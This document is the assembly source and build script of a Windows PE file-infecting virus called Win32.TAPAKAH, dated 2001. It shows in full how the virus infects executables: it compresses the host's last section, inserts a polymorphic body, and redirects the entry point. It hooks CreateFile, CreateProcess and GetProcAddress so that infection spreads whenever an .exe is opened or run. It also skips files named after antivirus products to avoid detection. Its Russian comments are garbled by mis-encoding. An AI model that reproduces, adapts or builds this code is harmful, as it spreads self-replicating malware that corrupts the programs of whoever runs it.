   ;@goto -)
   ; ============================ Win32.TAPAKAH ===========================
   ; Program       : TAPAKAH v1.0
   ; Description   : Parasitic,TSR,crypt PE virus
   ; Last modified : 09.04.2001
   ; Target OS     : Win95/98/NT
   ; Notes         :
   ; Œ¥â®¤ § à ¦¥¨ï.
   ; * å®¤¨¬ ¯®á«¥¤¥î á¥ªæ¨î ¦¥àâ¢ë. ‡ ¯ ª®¢ë¢ ¥¬ ¥¥. ‚¬¥áâ® ¥¥ § ¯¨áë¢ ¥¬
   ; á¢®© ª®¤. ‚ ª®¥æ ¦¥àâ¢ë ¤®¯¨áë¢ ¥¬ § ¯ ª®¢ ãî á¥ªæ¨î ®à¨£¨ « . Œ¥ï¥¬
   ; â®çªã ¢å®¤    á¢®© ª®¤.
   ; Œ¥â®¤ à á¯à®áâà ¥¨ï.
   ; *®á«¥ ¯®«ãç¥¨ï ã¯à ¢«¥¨ï, ª®¤ § â «ª¨¢ ¥âáï ¢ áâ¥ª ¨ â ¬ § ¯ãáª ¥âáï. *â®
   ; ®¡áâ®ïâ¥«ìáâ¢® ¯®§¢®«ï¥â ®âª § âìáï  ®â  âà¨¡ãâ®¢ RW ¯®á«¥¤¥© á¥ªæ¨¨. „ «¥¥
   ; ¬ë à á¯ ª®¢ë¢ ¥¬ á¥ªæ¨î ®à¨£¨ «  ¨ ¢®§¢à é ¥¬ ¥¥   ¬¥áâ®. *®á«¥ íâ®£®
   ; ¯¥à¥å¢ âë¢ ¥¬ CreateFileW - ¢ á«ãç ¥ NT ¨ CreateFileA, CreateProcess,
   ; GetProcAddress ¢ á«ãç ¥ 9å. *®á«¥ ç¥£® ®â¤ ¥¬ ã¯à ¢«¥¨¥ ¦¥àâ¢¥.
   ; CreateFileW ¯¥à¥å¢ âë¢ ¥âáï ¯¥à¥§ ¯¨áë¢ ¨¥¬ ¯¥à¢ëå 5-¨ ¡ ©â   ¨áâàãªæ¨î
   ; call NewCreateFileW. „«ï íâ®£® ¯à¥¤¢ à¨â¥«ì® ãáâ  ¢«¨¢ ¥âáï ¯à ¢  § ¯¨á¨
   ;   CreateFileW.
   ; CreateFileA, CreateProcess, GetProcAddress ¯¥à¥å¢ âë¢ ¥âáï ¯®¤¬¥®©  ¤à¥á®¢
   ; ¢ â ¡«¨æ¥ ¨¬¯®àâ®¢. MD9x ¥ ¯®§¢®«ï¥â ®âªàë¢ âì   § ¯¨áì ¯ ¬ïâì ¢ ª®â®à®©
   ;  å®¤¨âáï kernell32.dll.
   ; ‡ à ¦¥¨¥ ¯à®¨áå®¤¨â ¯à¨ ®âªàëâ¨¨ ä ©«  ¨«¨ á®§¤ ¨¨ ¯à®æ¥áá .
   ; Ÿ¢®© ¤¥áâàãªâ¨¢®© äãªæ¨¨ ¥ á®¤¥à¦¨â ;-) å¢ â ¥â ¥ï¢ëå.
   .386p
   .model flat
   include wvoodoo.inc
   include object.inc
   include macro.inc
   include exeption.inc
   .data
   FileName db 'qwerty.exe',0
   CreateFW db 'CreateFileA',0
   SysTime  db 1024 dup(?)
   .data?
   .code
   BADYSIZE EQU offset EndBegin- offset Begin
   DataBuffetSize EQU 1024h
   BeginC:
     mov eax,BADYSIZE
     xor edi,edi
     call Kern32VxInit
     xor edx,edx                 ;
     mov eax,offset FileName     ; * âç¨¬  FileName
     call Patch_File_by_Name     ;
     push 0
     call ExitProcess
   ;---------------------------------------
   ;---------------------------------------
   Begin:
   Delta1 EQU offset Entrypoint1 - offset  Begin
   Delta2 EQU offset Contin -offset Begin
           nextopc:
           ;---------------------------
           ; ˆ¨æ¨ «¨§¨àã¥¬ KERNEL32VX
             call InitKernel32dll
           ;---------------------------
           ; ‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï ¤ ëå ¨ ª®¤ 
           mov eax,BADYSIZE+DataBuffetSize
           push eax  ; á®åà ¨¬ ¥£® ¤«ï ¯¥à¥áë«ª¨
           call AllocMem
           mov edi,eax  ; edi=  ç «® ¢ë¤¥«¥®© ¯ ¬ïâ¨
           ;---------------------------
           call Entrypoint1
   Entrypoint1: pop esi

           sub_esi Delta1
           pop ecx      ; ‚á¯®¬¨¬ áª®«ìª®  ¤® ¯¥à¥á« âì
           sub ecx,DataBuffetSize
           push edi     ; á®åà ¨¬  ç «® ¢ë¤¥«¥®© ¯ ¬ïâ¨
           cld
           rep movsb    ; ¯¥à¥áë«ª 
           pop edi
           jmp Lastcmd  ; ¯¥à¥å®¤ ¢ ª®¥æ ª®¤    call @qr
          @qr:pop eax   ; eax= á¬¥é¥¨¥   ª®¥æ ª®¤ 
             ;--------------------------------
             ; ‚®áâ ®¢¨¬ SEH
             ; ret old seh
              xor edx,edx
              pop dword ptr fs:[edx]
              pop edx
             ;-----------  --------------------
             mov esp,eax    ; Ret Old Stack
                            ; ‘â¥ª   ª®¥æ ª®¤ 

             add_edi Delta2

             mov [esp],edi  ; ‚ áâ¥ª â®çªã ¢å®¤    ª®¬ ¤ã ¢ ¢ë¤¥«¥®©
                            ; ¯ ¬ïâ¨.
             popa           ; ‚®áâ ®¢«¥¨¥ à¥£¨áâà®¢
                            ;  á«¥¤¨¥ DINA v2.2 - v2.3
                            ;
             jmp edi        ; -----------------------\
                            ;                         |
                            ;                         |
   Contin:   db 0bfh        ; mov edi,XXXXXXXXh     <-|
   OldRVAEntrypoint dd 0eaeaebebh

             push edi       ; á®åà ¨¬ â®çªã ¢å®¤  ¢ ®á¨â¥«ì
             pusha
             ;* ©¤¥¬ PE  ¦¥àâ¢ë
             and edi,0ffff0000h
             mov cx,'ZM'-1234h
             add cx,1234h
             @@FMz:
             cmp word ptr [edi],cx
             je_ EDIIMBASE
             sub edi,1000h
             jmp @@FMz
   EDIIMBASE:
              mov ebx,edi
              add edi,[edi+3ch]          ;
              call Proc1                 ;
              add AX,word ptr [edi+14h]  ;
              add eax,18h                ; edi=object table
              add edi,eax                ; edi=Last Oject entry
              add ebx,[edi+SectionRVA]   ; ebx=RVA+IMBase of Last Oject
              mov edx,[edi+VirtualSize]
              mov esi,ebx
              ;------------------------------------------------
               call InitKernel32dll ; ˆ¨æ¨ «¨§¨àã¥¬ KERNEL32VX
      push esi
      push edx
              ; *®«ãç¨¬ ¨¬ï ¦¥àâ¢ë
              callEx GetCommandLineA
              cmp byte ptr [eax+1],':'  ;
              je_   NT
              cmp byte ptr [eax+2],':'  ;   á«ãç © ¥á«¨ ':' ®âáãâáâ¢ãîâ
              jne_  NT
              inc eax
              NT:
              ;---
              xchg eax,esi
           push esi
   FindBS:    cld                ; * ©¤¥¬ ¯à®¡¥« ¢ ª®æ¥ ª®¬ ¤®© áâà®ª¨
              lodsb              ;
              cmp al,0           ;
              je_ FindBSL1       ;
              cmp al,' '         ;
              jne_ FindBS        ;
   FindBSL1:
           pop eax
               inc edi
              push edi
              push 0
              push FILE_ATTRIBUTE_ARCHIVE or FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
              push OPEN_EXISTING
              push 0
              push FILE_SHARE_READ
              push GENERIC_READ
              push eax           ; offset CommandLine
              callEx CreateFileA ; Žâªà®¥¬  ¦¥àâ¢ã ¤«ï ¤®ç¨âë¢ ¨ï

              pop esi
              mov byte ptr [esi],' '
     pop edx
     pop ebx

               db 83h,0ech                  ;sub esp,SizeLockBuf
               db SizeLockBuf               ;
               mov ebp,esp

               mov [ebp+SectionRVA],ebx
               mov [ebp+VirtualSize],edx
               ;mov [ebp+@FileHandler],eax  ; save handle
               db 89h,45h
               db @FileHandler

              push 0
              push eax
              callEx GetFileSize

              ;mov [ebp+FileSize],eax        ; save filesize
              db 89h,45h
              db FileSize

              mov edi,PAGE_READONLY
              mov esi,FILE_MAP_READ
              call ReMapFile

              call Next4
   Delat3     EQU offset SizeofLastObject - offset Next4
   Next4:     pop edi
              add edi,Delat3

              ;mov esi,[ebp+Pointer2MapFile]
               db 8bh,75h
               db Pointer2MapFile

              ;add esi,[ebp+FileSize]
              db 03,75h
              db FileSize
              sub esi,[edi]  ; esi=LpPackedLastObject
              push esi
              mov ecx,dword ptr [ebp+VirtualSize]     ; “áâ ®¢¨¬  âà¨¡ãâ RW  
              mov esi,dword ptr [ebp+SectionRVA]      ; á¥ªæ¨î ¢ ª®â®à®© ¬ë ®¡¨â ¥¬
              call SetRW                              ;
              pop esi

              mov edi,[ebp+SectionRVA]                ;  * á¯ ªã¥¬ ¨å®¤ë¥ ¡ ©âë
              call unpack                             ;

              call CloseMapFile

              ;push dword ptr [ebp+@FileHandler]

              db 0ffh,75h
              db @FileHandler

              callEx CloseHandle

              ;add esp,SizeLockBuf
              db 83h,0c4h
              db SizeLockBuf
   ;---------------------------------------------------------------------------------
   ; *¥à¥å¢ â¨¬  CreateFile
   ;
                   mov ax,cs
                   cmp ax,01bh
                   jne_ WINCS

                   push 'Wel'  ; NT
                   push 'iFet'
                   push 'aerC'
                   push  esp ; Lp 2 str "CreateFileX",0
                   call PatchKernel32DLLA_L2
                   PatchKernel32DLLA_L2:
                   pop ebx
                   add ebx,offset hKernelHahdler -offset PatchKernel32DLLA_L2
                   push dword ptr [ebx]
                   callEx GetProcAddress
                   add esp,12
                   call LL1
                   LL1: pop ebp
                   add ebp,offset EndBegin - offset LL1
                   push eax
                   mov esi,eax
                   mov edi,ebp
                   mov ecx,07 ;
                   cld
                   rep movsb
                   mov al,68h    ; push XXXXXXh
                   stosb
                   pop eax
                   push eax
                   add eax,7
                   stosd         ; push CreateFileW+7
                   mov al,0c3h
                   stosb
                   pop edi       ; edi=CreateFileW
                   push esi
                   mov esi,edi
                   mov ecx,7
                   call SetRW
                   pop esi
                   mov al,68h
                   cld
                   stosb
                   mov eax,ebp
                   sub eax,offset EndBegin-offset NewCreateFileW
                   stosd
                   mov al,0c3h
                   stosb
                   jmp Ret2Prog

   WINCS:          push 0
                   callEx GetModuleHandleA
                   mov esi,eax
                   add eax,[eax+3ch]
                   mov edi,esi
                   add edi,[eax+80h] ; esi=Import Table
                   KERNEL32dllL2:
                   push esi
                   NameRVA EQU 0ch
                   mov eax,[edi+NameRVA]
                   or eax,eax
                   je_ LastEntry
                   add esi,eax
                   call CRCSum
                   cmp eax,zKERNEL32dll
                   je_ KERNEL32dllL1
                   add edi,14h
                   pop esi
                   jmp_ KERNEL32dllL2
   LastEntry:       pop esi
                   jmp Ret2Prog
   KERNEL32dllL1:   pop esi
                    AddressTableRVA EQU 10h
                    add esi,[edi+AddressTableRVA]

                    push ebp
                    sub esp,6*4
                    mov ebp,esp
                    push 'Ael'
                    push 'iFet'
                    push 'aerC'
                    mov [ebp],esp
                    push 'As'
                    push 'seco'
                    push 'rPet'
                    push 'aerC'
                    mov [ebp+4],esp
                    push 'ss'
                    push 'erdd'
                    push 'Acor'
                    push 'PteG'
                    mov [ebp+8],esp
                    mov ecx,3
                    xor ebx,ebx
                    KERNEL32dllL4:
                    push ecx
                    push dword ptr [ebp+ebx]
                    ; Crea teFi leA0,Crea tePr oces sA00,GetP rocA ddre ss00
                   call KERNEL32dllL3
                   KERNEL32dllL3:
                   pop edx
                   mov eax,edx
                   add eax,offset NewCreateFileA - offset KERNEL32dllL3
                   mov [ebp+12],eax

                   ;add eax,offset NewGetProcAddress - offset NewCreateFileA
                   db 83h,0c0h
                   db offset NewGetProcAddress - offset NewCreateFileA

                   mov [ebp+16],eax
                   add edx,offset hKernelHahdler -offset KERNEL32dllL3
                   push dword ptr [edx]
                   callEx GetProcAddress
                   pop ecx
                   mov [ebp+ebx],eax
                   add ebx,4
                   loop  KERNEL32dllL4
                   add esp,44
                   call KERNEL32dllL8
   KERNEL32dllL8:  pop ebx
   KERNEL32dllL7:
                   lodsd
                   or eax,eax
                   je_ EndOfAddressTable
                   cmp eax,[ebp]
                   jne_ KERNEL32dllL5
                   mov [ebx+(offset NewCreateFileA- offset KERNEL32dllL8)+1],eax
                   call SetRWdd
                   mov eax,[ebp+12]
                   mov [esi],eax
                   KERNEL32dllL5:
                   cmp eax,[ebp+4]
                   jne_ KERNEL32dllL6
                   mov [ebx+(offset NewCreateProcess- offset KERNEL32dllL8)+1],eax
                   call SetRWdd
                   mov eax,[ebp+12]

                   ;sub eax,offset NewCreateFileA - offset NewCreateProcess
                   db 83h,0e8h
                   db offset NewCreateFileA - offset NewCreateProcess

                   mov [esi],eax
                   KERNEL32dllL6:
                   cmp eax,[ebp+8]
                   jne_ KERNEL32dllL7
                   mov [ebx+(offset NewGetProcAddress- offset KERNEL32dllL8)+1],eax
                   call SetRWdd
                   mov eax,[ebp+16]
                   mov [esi],eax

   EndOfAddressTable:
                   add esp,6*4               ; ‚®áâ ®¢¨¬ áâ¥ª
                   pop ebp                   ;
   Ret2Prog:       ; ret old seh
                   xor ecx,ecx               ;
                   pop dword ptr fs:[ecx]    ;
                   pop ecx                   ;
                   popa                      ;
                   RET                       ; *¥à¥¤ ç  ã¯à ¢«¥¨ï ¦¥àâ¢¥
   ;----------------------------------------------------------
   ;----------------------------------------------------------
   SetRWdd:
            sub esi,4
            mov ecx,4
            call SetRW
            ret
   ;----------------------------------------------------------
   ;----------------------------------------------------------
   SetRW:     push ecx
              callEx GetCurrentProcess
              pop ecx
              push ecx
              push esp
              push PAGE_EXECUTE_READWRITE
              push ecx
              push esi
              push eax
              callEx VirtualProtectEx
              pop ecx
              ret
   ;----------------------------------------------------------
   InitKernel32dll: pop ebx
                    xor edi,edi
                    call Kern32VxInit
                    jmp ebx
   ;----------------------------------------------------------
   NewCreateProcess: mov eax,12345678h
                     jmp_ NewCreateFileA+5
   NewCreateFileA:  mov eax,12345678h
                    pusha
                    call InitKernel32dll

                    ;mov edi,[esp+pushadd+8+4] ; smec4enie na imya
                     db 8bh,7ch,24h
                     db pushadd+8+4

                    push edi
                    dec edi
                    call  Upcase
                    mov eax,[edi-4]
                    pop ecx
                    cmp eax,'EXE.'
                    jne_ Ret2ProgExec
                    mov esi,edi
                    call Find1stSlash
                    call NameTestProc
                    or eax,eax
                    jne_ Ret2ProgExec
                    mov eax,ecx
                    xor edx,edx
                    call Patch_File_by_Name
                    jmp_ Ret2ProgExec

   NewGetProcAddress: mov eax,12345678h
                      pusha
                     ;mov ax,[esp+pushadd+8+2]
                     db 66h,8bh,44h,24h
                     db pushadd+8+2

                     or ax,ax
                     je_ OrdinalValue

                     ;mov esi,[esp+pushadd+8]
                     db 08bh,74h,24h
                     db pushadd+8

                     call CRCSum
                     cmp eax,zCreateFileA
                     jne_ TestCreateProcess

                     call GetCurEIP
   NewGetProcAddressL1: sub eax,offset NewGetProcAddressL1- offset NewCreateFileA
                        mov [esp+28],eax
                        jmp_ endofGetProc

   TestCreateProcess: cmp eax,zCreateProcessA
                      jne_ OrdinalValue

                       call GetCurEIP
   NewGetProcAddressL2: sub eax,offset NewGetProcAddressL2- offset NewCreateProcess
                        mov [esp+28],eax
   endofGetProc:        popa
                        ret

   Ret2ProgExec:
                   xor ecx,ecx
                   pop dword ptr fs:[ecx]
                   pop ecx

   OrdinalValue:
                   popa
                   jmp eax
   ;----------------------------------------------------------------------------
   ;----------------------------------------------------------------------------
   NewCreateFileW: pusha
                   call NewCreateFileWL1
   @3AHyaTO         db 0
                   NewCreateFileWL1:
                   pop ebx
                   mov al,byte ptr [ebx]
                   or al,al
                   jne_ OldCreateFileWL1
                   xor edi,edi
                   call Kern32VxInit

                   ;mov eax,[esp+4+8+pushadd] ;offset to fileName
                   db 08bh,44h,24h
                   db 4+8+pushadd

                   mov esi,eax
                   call TestFileName
                   or eax,eax
                   je_ OldCreateFileWL1
                   xor edx,edx
                   inc edx
                   inc byte ptr [ebx]
                   call Patch_File_by_Name
                   dec byte ptr [ebx]
                   xor ecx,ecx
                   pop dword ptr fs:[ecx]
                   pop ecx
   OldCreateFileWL1:
                   popa
                   jmp OldCreateFileW
   ;----------------------------------------------------------------------------
   ;----------------------------------------------------------------------------
   ;----------------------------------------------------------------------------
   TestFileName:  push ebp
                  EndOfUnic EQU 0
                  EndOfANSI EQU EndOfUnic+4
                  sub esp,4*2
                  mov ebp,esp

                  mov edi,esi
                  push edi
   TestFileNameL2:                            ;  preobrazuem imya is unic v asni
                  cld                         ;
                  lodsw                       ;
                  or ax,ax                    ;
                  je_ TestFileNameL1          ;
                  cld                         ;
                  stosb                       ;
                  jmp_ TestFileNameL2         ;

   TestFileNameL1:cld
                  stosb
                  dec edi ; edi=EndOfString
                  dec esi
                  dec esi
                  mov [ebp+EndOfUnic],esi
                  mov [ebp+EndOfANSI],edi

                  mov eax,[edi-4]         ; '.EXE' ?
                  cmp eax,'EXE.'          ;
                  je_ ThisIsEXE           ;
                  cmp eax,'exe.'          ;
                  jne_ ThisIsNotEXE       ;

   ThisIsEXE:     mov esi,edi
                  pop ecx
                  push ecx
                  call Find1stSlash
                  pop edi
                  push edi
                  dec edi
                  call Upcase
                  call NameTestProc
                  or eax,eax
                  jne_ @@AV
                  pop esi
                  push esi
                  call RetUnicS
                  pop eax
                  pop ebp
                  add esp,4*2
                  ret
   @@AV:
   ThisIsNotEXE:  pop esi
                  call RetUnicS
                  xor eax,eax
                  pop ebp
                  add esp,4*2
                  ret
   ;--------------------------------------------------------------------
   GetCurEIP:pop eax
             jmp eax
   ;--------------------------------------------------------------------
   NameTestProc:
                  cmp dword ptr [esi-3],'23ME'  ; \sysytem32\
                  je_ @AV
                  cmp dword ptr [esi-3],'METY'  ; \system\
                  je_ @AV
                  inc esi
                  inc esi
                  cmp word ptr [esi],'-F'   ;F-port
                  je_  @AV
                  cmp word ptr [esi],'WA'   ; AW ?
                  je_  @AV
                  cmp word ptr [esi],'VA'   ; AV?????
                  je_  @AV
                  cmp word ptr [esi+1],'VA' ;NAV,PAV,RAV,_AVP???
                  je_  @AV
                  cmp word ptr [esi+3],'BE' ;drWeb
                  je_  @AV
                  cmp word ptr [esi+2],'DN' ;PANDA
                  je_  @AV
                  cmp dword ptr [esi],'ITNA';ANTI???
                  je_  @AV
                  cmp dword ptr [esi],'FASV';VSAF???
                  je_  @AV
                  cmp dword ptr [esi],'PWSV';VSWP???
                  je_  @AV
                  cmp dword ptr [esi],'VASF';FSAV???
                  je_  @AV
                  xor eax,eax
                  @AV:
                   ret

   ;--------------------------------------------------------------------
    Upcase:      pusha
                 jmp_ ErrorTrap
    UpcaseL2:    xor eax,eax
                 push dword ptr fs:[eax]
                 mov fs:[eax],esp
   UpcaseL3:     inc edi
                 cmp byte ptr [edi],0
                  je_ UpcaseL1
                  cmp byte ptr [edi],41h
                  jl_ UpcaseL3
                  and byte ptr [edi],11011111b
                  cmp byte ptr [edi],0
                  jne_ UpcaseL3
   UpcaseL1:
                   xor eax,eax
                   pop dword ptr fs:[eax]
                   pop eax
                   popa
                   ret
   ErrorTrap:    call  UpcaseL2
                 nop
                 mov eax,[esp]
                 mov esp,[esp+8]
                 jmp_ UpcaseL1
   ;--------------------------------------------------------------------
   Find1stSlash:
   ThisIsEXEL1:   cmp ecx,esi             ; find 1st slash
                  je_ Slash               ;
                  std                     ;
                  lodsb                   ;
                  cmp al,'\'              ;
                  jne_ ThisIsEXEL1        ;
   Slash:         cld
                  ret

   RetUnicS:      mov edi,[ebp+EndOfUnic]
                  mov esi,[ebp+EndOfANSI]
   Convert:
                  xor ax,ax
                  std
                  lodsb
                  stosw
                  cmp edi,esi
                  jge Convert
                  cld
                  ret
   ;----------------------------------------------------------------------------
   ;----------------------------------------------------------------------------
   ;----------------------------------------------------------------------------
    Patch_File_by_Name:
   ; in eax=FileName
   ;    edx=TypeString (0-ASNI;1-UNIC)
     LastObject       EQU    0
     LpPackedObject   EQU    LastObject        +2ch
     LpNewPolyBady    EQU    LpPackedObject    +4
    SizeOfNewPolyBady EQU    LpNewPolyBady     +4
     Pointer2MapFile  EQU    SizeOfNewPolyBady +4
    HheandleOfMapFile EQU    Pointer2MapFile   +4
     FileSize         EQU    HheandleOfMapFile +4
     @FileHandler     EQU    FileSize          +4
     SizeLockBuf      EQU    @FileHandler      +4
            pusha
            sub esp,SizeLockBuf
            mov ebp,esp
            push edx
            mov esi,eax
            push esi
            push 20h
            push eax
            or edx,edx
            je_ ANSIL1
            push zSetFileAttributesW
            jmp_ ANSIL1+5
     ANSIL1:push zSetFileAttributesA
             EXEPTION
             pop  esi
             pop edx

            push NULL
            push FILE_ATTRIBUTE_ARCHIVE
            push OPEN_EXISTING
            push NULL
            push FILE_SHARE_READ or FILE_SHARE_WRITE
            push GENERIC_READ or GENERIC_WRITE
            push esi ; offset 2 File name
            or edx,edx
            je_ ANSI
             push zCreateFileW
             jmp_ ANSI+5
       ANSI: push zCreateFileA
             EXEPTION
            mov [ebp+@FileHandler],eax
            inc eax
            jz Error1
            dec eax
            push NULL
            push eax
            callEx GetFileSize   ; *®«ãç¨«¨ ¥£® à §¬¥à
            mov [ebp+FileSize],eax
            mov edi,PAGE_READWRITE
            mov esi,FILE_MAP_WRITE
            call ReMapFile


            mov edi,eax
            mov ax,40h
            cmp word ptr [edi+18h],ax
            jl BadMZ
            mov eax,[edi+3ch]
            mov edx,[edi+eax]
            sub dl,dh
            xor dl,0bh        ; PE ?
            jnz  BadMZ
            add edi,eax
            mov ecx,'APAT'  ;TAPAKAN!
            cmp [edi+0e0h],ecx
            je BadMZ
            mov dx,word ptr[edi+14h] ; NT header Size
            add edx,18h
            mov esi,edx
            add esi,edi ; esi=Object Table
            call Proc1
            add esi,eax ; esi=offset 2 Last object entry
            mov eax,esi
            sub eax,[ebp+Pointer2MapFile]
   push eax
            push edi
            mov edi,ebp
            mov ecx,0ah
            cld
            rep movsd   ; save   Last object entry
            pop edi
            ;------------- Set New RVA ---------------
   offset2OldRVAEntrypoint EQU offset Next3 - offset OldRVAEntrypoint
                     call Next3
   Next3:            pop ebx
                     mov eax,[edi+28h]
                     mov  [ebx-offset2OldRVAEntrypoint],eax
                     mov eax,[edi+34h]
                     add [ebx-offset2OldRVAEntrypoint],eax
                     mov eax,[ebp+SectionRVA]
                     mov [edi+28h],eax
            ;----------------------------------------;
            ;----------------------------------------;
            ;---- commpress last object -------------;
            push ebp                                 ;
            mov eax,[ebp+Pointer2MapFile]            ;
            add eax,[ebp+PhysicalOffset]             ;
            push eax
            mov eax,[ebp+PhysicalSize]               ;;
            push eax                                 ;; PhysicalSize Object
            call AllocMem                            ;;
            mov [ebp+LpPackedObject],eax             ;;
            push eax                                 ;; Lp2CommpressDataBuffer
            call Next1                               ;; Lp2DwSizeOfCommprData
            SizeofLastObject dd ?                    ;
            Next1: call LZPack                       ;
            pop ebp                                  ;
            ;----------------------------------------;
            ;----------------------------------------;
            mov eax,0ch
            call RandEAX
            push ax
            push ax
            mov eax,BADYSIZE*20
            call AllocMem
            mov [ebp+LpNewPolyBady],eax
            mov edi,eax
            call Next2
   Next2:   pop esi
            offset2Begin EQU offset Next2 - offset Begin
            sub esi,offset2Begin
            mov ecx,BADYSIZE
            xor edx,edx
            call MakePolyImg
            mov [ebp+SizeOfNewPolyBady],eax
            ;--------------------------------------------
            ;--------------------------------------------
             call CloseMapFile
             offset2SizeofLastObject EQu offset SizeofLastObject - offset Begin
             add eax,[ebp+PhysicalOffset]
             add eax,[esi+offset2SizeofLastObject]
             ; NewSizeFile=PhysicalOffsetOfLastObject+NewPolyBadySize+SizeofLastPackObject
             ;push eax
             pusha
             mov edi,PAGE_READWRITE
             mov esi,FILE_MAP_WRITE
             call ReMapFile
             popa
             push NuLL
             push dword ptr [ebp+@FileHandler]
             callEx GetFileSize
             mov edi,eax
             sub edi,[esi+offset2SizeofLastObject]
             add edi,[ebp+Pointer2MapFile]
             mov ecx,[esi+offset2SizeofLastObject]
             mov esi,[ebp+LpPackedObject]
             cld
             rep movsb     ; § ¯¨á «¨ PackedObject ¢ …¤Ž”
             ;---------
              mov edi,[ebp+Pointer2MapFile]
              add edi,[ebp+PhysicalOffset]
              mov esi,[ebp+LpNewPolyBady]
              mov ecx,[ebp+SizeOfNewPolyBady]
              cld
              rep movsb
            ;---------------------------------------------
             mov eax,[ebp+SizeOfNewPolyBady]
             cmp dword ptr [ebp+PhysicalSize],eax
             jnl_ @@L1
             mov dword ptr [ebp+PhysicalSize],eax
             @@L1:
           ;---------------------------------------------
              mov eax,[ebp+Pointer2MapFile]
              add eax,[eax+3ch]  ; eax=PE h
              StackCommitSize equ 64h
              add dword ptr [eax+StackCommitSize],(BADYSIZE/1000h +1)*1000h
              mov ecx,'APAT'
              mov [eax+0e0h],ecx
              mov ecx,'!HAK'
              mov [eax+0e4h],ecx
              mov edx,[eax+FileAlign]
              call calcbits
              mov edx,[ebp+PhysicalSize]
              call _Align
              mov [ebp+VirtualSize],edx
              mov edx,[eax+ObjectAlign]
              call calcbits
              mov edx,[ebp+SectionRVA]
              add edx,[ebp+VirtualSize]
              call _Align
              cmp edx,[eax+ImgSize]
              jle_ @@L2
              mov [eax+ImgSize],edx
              @@L2:
            ;----------------------------------------------
   pop edi
            add edi,[ebp+Pointer2MapFile]
            mov esi,ebp    ;
            mov ecx,0ah
            cld
            rep movsd   ; save New Last object entry
            ;----------------------------------------------
            call CloseMapFile
            nop
   BadMZ:   push dword ptr [ebp+@FileHandler]
            callEx CloseHandle
   Error1:  add esp,SizeLockBuf
            popa
            ret
   calcbits:
              xor ecx,ecx
              @Shr:
              shr edx,1
              inc ecx
              or edx,edx
              jne_ @Shr
              dec ecx
            ret
   _Align:    push eax
              push edx
              shr edx,cl
              shl edx,cl
              pop eax
              cmp eax,edx
              je_ _AlignL1
              shr edx,cl
              inc edx
              shl edx,cl
   _AlignL1:  pop eax
              ret
            ;-------------------------------------------
            CloseMapFile:
             pusha
             push dword ptr [Pointer2MapFile+ebp]
             callEx  UnmapViewOfFile
             push dword ptr [HheandleOfMapFile+ebp]
             callEx CloseHandle
             popa
             ret
            ;-------------------------------------------
            ReMapFile:
            ; <- eax=Size to map
            ;  -> Remapped file
            push eax
            push NULL
            push eax
            push NULL
            push edi ;PAGE_READWRITE
            push NULL
            push dword ptr [ebp+@FileHandler]
            callEx CreateFileMappingA
            mov [HheandleOfMapFile+ebp],eax
            ; v steke size
            push 0
            push 0
            push esi;FILE_MAP_WRITE
            push eax
            callEx MapViewOfFile  ; ‡ ¬ ¯¨¬ ¥£®
            mov [Pointer2MapFile+ebp],eax
            ret
   ;---------------------------------------
   ;---------------------------------------
   Proc1:   xor eax,eax
            add ax,[edi+NumOfObjects]
            dec eax
            mov cl,28h
            mul cl
            ret
   AllocMem:
        ;-> eax=MemSize
        ;<- eax=lpMemBuffer
        push eax
        push 0
        callEx GlobalAlloc
        push eax
        callEx GlobalLock
        ret
   ;---------------------------------------------------------------------------
   include kern32vx.inc
   include dinav2.inc
   include LZPACK.inc
   ;---------------------------------------------------------------------------
   Lastcmd: call @qr
   EndBegin:
   OldCreateFileW:
   db 10 dup(90h)
   DataBuff:
     db 90h
   db 1110 dup(90h)
   ends
   end BeginC
   :-)
   @echo off
   @echo Š®¬¯¨«¨¬ ...
   @z:\all.bin\tasm32.bin\tasm.exe  program.cmd
   @echo ‹¨ªã¥¬  ...
   @z:\all.bin\tasm32.bin\tlink32.exe /Tpe /aa /c  program,,, z:\all.bin\tasm32.bin\import32.lib
   @echo “áâ ®¢¨¬  âà¨¡ãâ RW   á¥ªæ¨î ª®¤  ¤«ï ¯¥à¢®£® § ¯ãáª .
   setwrite.exe program.exe
